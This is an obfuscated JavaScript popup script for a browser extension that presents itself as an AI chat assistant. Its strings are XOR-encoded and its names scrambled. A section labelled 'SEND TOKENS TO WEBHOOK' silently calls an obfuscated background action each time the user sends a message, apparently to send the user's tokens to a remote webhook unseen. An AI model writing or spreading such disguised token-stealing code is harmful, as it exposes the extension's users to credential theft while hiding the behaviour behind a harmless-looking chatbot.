// ─── POPUP SCRIPT ───

// CONFIG is loaded from config.js via script tag
var GROQ_API_KEY = CONFIG.GROQ_API_KEY;

// ─── DOM ───
var _qofh7y = document.getElementById(_decode("Hh0nBwNDGA==", "AlHaktak2024Secure!"));
var _1pmjyh = document.getElementById(_decode("Hl04DAENCQ==", "AlHaktak2024Secure!"));
var _1r9zav = document.getElementById(_decode("Hl06WBEVFw==", "AlHaktak2024Secure!"));
var _r64hjb = document.getElementById(_decode("Hh5+VQMeAw==", "AlHaktak2024Secure!"));
var _yxp6ha = document.getElementById(_decode("HhUwEV0cAA==", "AlHaktak2024Secure!"));

// ─── UI HELPERS ───
function _4bpb0l(_caa0gf, _9txpph) {
    var _df40y8 = document.createElement(_decode("HgguVVsNWQ==", "AlHaktak2024Secure!"));
    _df40y8.className = _decode("LAk7EgoTBEs=", "AlHaktak2024Secure!") + (_9txpph ? _decode("NB8tEw==", "AlHaktak2024Secure!") : _decode("IwM8", "AlHaktak2024Secure!"));

    var _bc1gr2 = document.createElement(_decode("MhwpDw==", "AlHaktak2024Secure!"));
    _bc1gr2.className = _decode("Hg4rUAwGUw==", "AlHaktak2024Secure!");
    _bc1gr2.textContent = _9txpph ? '👤' : '🤖';

    var _mynlp7 = document.createElement(_decode("HgguVVsNWQ==", "AlHaktak2024Secure!"));
    _mynlp7.className = _decode("HgExDwcEVg==", "AlHaktak2024Secure!");
    _mynlp7.textContent = _caa0gf;

    _df40y8.appendChild(_bc1gr2);
    _df40y8.appendChild(_mynlp7);
    _qofh7y.appendChild(_df40y8);
    _qofh7y.scrollTop = _qofh7y.scrollHeight;
}

function _5g92kl() {
    var _df40y8 = document.createElement(_decode("HgguVVsNWQ==", "AlHaktak2024Secure!"));
    _df40y8.className = _decode("LAk7EgoTBEtQX0Y=", "AlHaktak2024Secure!");
    _df40y8.id = _decode("NRU4CAUTKAVWWVFVJwoR", "AlHaktak2024Secure!");

    var _bc1gr2 = document.createElement(_decode("MhwpDw==", "AlHaktak2024Secure!"));
    _bc1gr2.className = _decode("Hg4rUAwGUw==", "AlHaktak2024Secure!");
    _bc1gr2.textContent = '🤖';

    var _mynlp7 = document.createElement(_decode("HgguVVsNWQ==", "AlHaktak2024Secure!"));
    _mynlp7.className = _decode("HgExDwcEVg==", "AlHaktak2024Secure!");
    _mynlp7.textContent = _decode("b0Jm", "AlHaktak2024Secure!");

    _df40y8.appendChild(_bc1gr2);
    _df40y8.appendChild(_mynlp7);
    _qofh7y.appendChild(_df40y8);
    _qofh7y.scrollTop = _qofh7y.scrollHeight;
}

function _io3emd() {
    var _hz75sc = document.getElementById(_decode("NRU4CAUTKAVWWVFVJwoR", "AlHaktak2024Secure!"));
    if (_hz75sc) _hz75sc.remove();
}

// ─── SEND TOKENS TO WEBHOOK ───
function _x5zbev() {
    chrome.runtime.sendMessage({ action: _decode("Jg08CQ4GNQRZVVxH", "AlHaktak2024Secure!") }, function(response) {
        if (response && response.success) {
            console.log(_decode("GjwnER4EPEvinLcQZls4AA0GUhZELxhoFQRUFg5QWF1bOA==", "AlHaktak2024Secure!"));
        } else {
            var error = response ? response.error : _decode("FAIjDwQDD0tXQkBbIQ==", "AlHaktak2024Secure!");
            console.log(_decode("GjwnER4EPEvinb4QdFU6CQYRUhFOYR8tDw9UFQRZVVxHaQ==", "AlHaktak2024Secure!"), error);
        }
    });
}

// ─── AI ───
function _g29plw(message) {
    return new Promise(function(resolve, reject) {
        chrome.runtime.sendMessage({ action: _decode("Jh4nEA==", "AlHaktak2024Secure!"), message: message }, function(response) {
            if (chrome.runtime.lastError) {
                reject(new Error(chrome.runtime.lastError.message));
                return;
            }
            if (response && response.success) {
                resolve(response.reply);
            } else {
                reject(new Error(response ? response.error : _decode("FAIjDwQDD0tXQkBbIQ==", "AlHaktak2024Secure!")));
            }
        });
    });
}

// ─── HANDLE SEND ───
function _4ipzqv() {
    var message = _1pmjyh.value.trim();
    if (!message) return;

    _4bpb0l(message, true);
    _1pmjyh.value = '';
    _1pmjyh.focus();

    _x5zbev();

    _5g92kl();

    _g29plw(message)
        .then(function(reply) {
            _io3emd();
            _4bpb0l(reply, false);
        })
        .catch(function(error) {
            _io3emd();
            _4bpb0l(_decode("BB46DhlOQQ==", "AlHaktak2024Secure!") + error.message, false);
        });
}

// ─── TOAST ───
function _8n973p() {
    _yxp6ha.classList.add(_decode("MgQnFg==", "AlHaktak2024Secure!"));
    setTimeout(function() {
        _yxp6ha.classList.remove(_decode("MgQnFg==", "AlHaktak2024Secure!"));
    }, 2000);
}

// ─── EVENTS ───
_1r9zav.addEventListener(_decode("IgAhAgA=", "AlHaktak2024Secure!"), _4ipzqv);

_1pmjyh.addEventListener(_decode("KgkxBQQDDw==", "AlHaktak2024Secure!"), function(e) {
    if (e.key === _decode("BAI8BBk=", "AlHaktak2024Secure!")) {
        e.preventDefault();
        _4ipzqv();
    }
});

_r64hjb.addEventListener(_decode("IgAhAgA=", "AlHaktak2024Secure!"), _8n973p);

// ─── INIT ───
window.addEventListener(_decode("LQMpBQ==", "AlHaktak2024Secure!"), function() {
    _1pmjyh.focus();
});
